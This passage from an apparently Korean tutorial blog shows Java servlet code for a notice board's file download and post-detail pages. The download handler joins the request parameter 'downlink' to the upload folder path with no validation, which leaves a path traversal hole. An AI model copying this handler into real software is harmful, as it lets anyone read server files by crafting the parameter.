	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 게시글 파일 다운로드</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardFileDownload</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">downlink</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"downlink"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">filePath</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">downlink</span><span class="o">).</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"UTF-8"</span><span class="o">));</span> <span class="c1">// utf-8로 바꿔준다.</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">filePath</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">isFile</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">filesize</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">sMimeType</span> <span class="o">=</span> <span class="n">getServletContext</span><span class="o">().</span><span class="na">getMimeType</span><span class="o">(</span><span class="n">filePath</span><span class="o">);</span> <span class="c1">// 확장자에 따라 달라진다.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">sMimeType</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">sMimeType</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">==</span> <span class="mi">0</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">sMimeType</span> <span class="o">=</span> <span class="s">"application/octet-stream"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">BufferedInputStream</span> <span class="n">fin</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">BufferedOutputStream</span> <span class="n">outs</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">fileName</span><span class="o">=</span> <span class="n">downlink</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">"/"</span><span class="o">)[</span><span class="mi">1</span><span class="o">];</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">b</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">8192</span><span class="o">];</span>
  
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="n">sMimeType</span><span class="o">+</span><span class="s">"; charset=utf-8"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">userAgent</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"User-Agent"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">userAgent</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">userAgent</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">userAgent</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"MSIE 5.5"</span><span class="o">)){</span> <span class="c1">// MSIE 5.5 이하</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">userAgent</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">userAgent</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"MSIE"</span><span class="o">)){</span> <span class="c1">// MS IE</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">else</span><span class="o">{</span> <span class="c1">// 모질라</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">setHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">,</span> <span class="s">"attachment; filename="</span><span class="o">+</span> <span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="n">fileName</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"utf-8"</span><span class="o">),</span> <span class="s">"latin1"</span><span class="o">)</span> <span class="o">+</span> <span class="s">";"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 사이즈 정확히 알아야함</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">filesize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">setHeader</span><span class="o">(</span><span class="s">"Content-Length"</span><span class="o">,</span> <span class="s">""</span><span class="o">+</span><span class="n">filesize</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">fin</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">outs</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedOutputStream</span><span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">read</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span><span class="o">((</span><span class="n">read</span><span class="o">=</span> <span class="n">fin</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">b</span><span class="o">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">outs</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">b</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">read</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">fin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">outs</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<p><br /></p>
<ul>
  <li>글 자세히 보기</li>
  <li>href 링크를 만들어 jsp 에 전달해 준다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 자세히 보기</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardDetail</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 파일들 읽어 오기 ***</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// href 링크 만들기</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folderName</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getGenTime</span><span class="o">()+</span><span class="s">"_"</span><span class="o">+</span><span class="n">noticeSID</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">uploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">folderName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 다운로드 get 파라미터 이름</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">fileNameList</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Pair</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;&gt;();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">uploadPath</span><span class="o">);</span> <span class="c1">// 폴더</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">folder</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">files</span> <span class="o">=</span> <span class="n">folder</span><span class="o">.</span><span class="na">listFiles</span><span class="o">();</span> <span class="c1">// 파일들</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="n">file</span> <span class="o">:</span> <span class="n">files</span><span class="o">)</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">fileName</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">hrefPrameter</span> <span class="o">=</span> <span class="n">folderName</span><span class="o">+</span><span class="s">"%2F"</span><span class="o">+</span><span class="n">fileName</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">fileNameList</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nc">Pair</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;(</span><span class="n">fileName</span><span class="o">,</span><span class="n">hrefPrameter</span><span class="o">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">fileNameList</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"fileNameList"</span><span class="o">,</span> <span class="n">fileNameList</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"noticeBoardFileDownload"</span><span class="o">,</span> <span class="n">noticeBoardFileDownload</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 파일들 읽어 오기 end ***</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"notice"</span><span class="o">,</span> <span class="n">notice</span><span class="o">);</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getSid</span><span class="o">()</span> <span class="o">==</span> <span class="n">notice</span><span class="o">.</span><span class="na">getUserSID</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"modifyButton"</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"modifyHref"</span><span class="o">,</span> <span class="n">noticeBoardModify</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"deleteHref"</span><span class="o">,</span> <span class="n">noticeBoardDelete</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">gotoForwardPage</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="s">"/WEB-INF/main_page/notice_board/notice_detail.jsp"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<h2 id="공통-코드">공통 코드</h2>
<ul>
  <li>MainPage.java 의 getFilePath 함수</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err"> </span> <span class="err"> </span> <span class="kd">private</span> <span class="nc">String</span> <span class="nf">getFilePath</span><span class="o">(</span><span class="nc">ServletRequest</span> <span class="n">request</span><span class="o">,</span><span class="nc">String</span> <span class="n">folderName</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getRealPath</span><span class="o">(</span><span class="s">"/WEB-INF/upload_folder/"</span><span class="o">+</span><span class="n">folderName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="n">path</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<h2 id="게시글-조회수">게시글 조회수</h2>
<h3 id="db">DB</h3>
<ul>
